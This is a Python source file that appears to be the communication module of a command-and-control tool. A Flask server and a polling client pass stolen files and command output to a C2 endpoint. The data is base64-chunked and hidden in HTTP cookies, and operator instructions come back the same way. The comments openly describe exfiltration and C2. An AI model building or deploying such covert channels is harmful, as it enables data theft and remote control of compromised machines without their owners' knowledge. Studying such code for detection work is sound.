from flask import Flask, request, Response
from threading import Event, Lock
from typing import Callable
from .client import Client
from sys import getsizeof
from queue import Queue
from time import sleep
import requests
import base64
import io


app = Flask(__name__)

CLIENTS = dict()
CLIENTS_LOCK = Lock()

ENC_FUNC = lambda data : data
DEC_FUNC = lambda data : data


def gen_string_chunks(string: str, chunk_size: int = 256):
    for i in range(0, len(string), chunk_size):
        yield string[i:i + chunk_size]

def gen_file_chunks(stream: io.BufferedReader, chunk_size: int = 256):
    yield read_chunk_of_file(stream, chunk_size)

def read_file(filename: str):
    return open(filename, "rb")

def read_chunk_of_file(stream, chunk_size):
    return stream.read(chunk_size)

def write_file(filename: str):
    return open(filename, "ab")

def write_chunk_to_file(stream, chunk_size):
    return stream.write(chunk_size)

def string_chunks(string: str, chunk_size: int = 256):
    res = []
    for i in range(0, len(string), chunk_size):
        res.append(string[i:i + chunk_size])
    return res    

def gen_chunks(data, chunk_size: int = 1000):
    if isinstance(data, io.BufferedReader):
        chunk = read_chunk_of_file(data, chunk_size)
        while chunk:
            yield str(base64.b64encode(chunk), "utf-8")
            chunk = read_chunk_of_file(data, chunk_size)        
    if isinstance(data, str):
        chunks = string_chunks(data, chunk_size)
        for chunk in chunks:
            yield str(base64.b64encode(str.encode(chunk)), "utf-8")

@app.route("/api")
def communicate_to_client():
    global CLIENTS, CLIENTS_LOCK
    req_cookies = request.cookies

    client_name = req_cookies.get('0')
    packet_id = req_cookies.get('1')
    packet_type = req_cookies.get('2')
    packet_data = req_cookies.get('3')

    with CLIENTS_LOCK:
        if client_name not in CLIENTS.keys():
            CLIENTS[client_name] = Client(client_name)
        client = CLIENTS[client_name]

        packet_data = base64.b64decode(DEC_FUNC(packet_data))
        packet_type = DEC_FUNC(packet_type)
        
        if packet_type == 'stdout':
            client.get_stdout_queue().put(packet_data)

        elif 'file ' in packet_type :
            client.get_file_queue().put({'file': packet_type.replace('file ', ''),'data': packet_data})

    resp = Response()
    resp.set_cookie("0", ENC_FUNC(client.get_stdout_queue().get()))
    return resp

def gen_cookies(client_id, packet_id, data, type="", chunk_size: int = 100) -> dict:
    # prepare data to be exfiltrated
    cookies = {         # Max cookie size 4093 bytes
        '0': str(client_id),
        '1': str(packet_id),
        '2': ENC_FUNC(str(type)),  # Type [+ filename]
    }
    
    # 3: Data frame
    for chunk in gen_chunks(data, chunk_size):
        cookies['3'] = ENC_FUNC(chunk)
        yield cookies

def communicate_to_cc(url, cookies: dict) -> dict:
    r = requests.get(url, cookies=cookies)
    # extract instructions from CC    
    return DEC_FUNC(r.cookies.get('0'))

def communication_client_main(identifier: str, exfiltrate_queue: Queue,  instructions_queue: Queue, encryption_function: Callable = ENC_FUNC, decryption_function: Callable = DEC_FUNC, time_between_requests: int = 4, url="http://127.0.0.1:8080/api"):
    global ENC_FUNC, DEC_FUNC
    ENC_FUNC = encryption_function
    DEC_FUNC = decryption_function

    while True:
        sleep(time_between_requests)
        element = exfiltrate_queue.get()

        if isinstance(element, dict):
            data_type = f"file {element['filename']}"
            data = element['data']
        else:
            data_type = "stdout"
            data = element

        for cookie in gen_cookies(identifier, "id", data, data_type):
            resp = communicate_to_cc(url, cookie)
            instructions_queue.put(resp)
        
def communication_server_main(clients: dict, clients_lock: Lock, shutdown_signal: Event, encryption_function: Callable = ENC_FUNC, decryption_function: Callable = DEC_FUNC, ip: str = "127.0.0.1", port: int = 8080):
    global CLIENTS, CLIENTS_LOCK, ENC_FUNC, DEC_FUNC
    CLIENTS = clients
    CLIENTS_LOCK = clients_lock

    ENC_FUNC = encryption_function
    DEC_FUNC = decryption_function

    app.run(ip, port) # , debug=True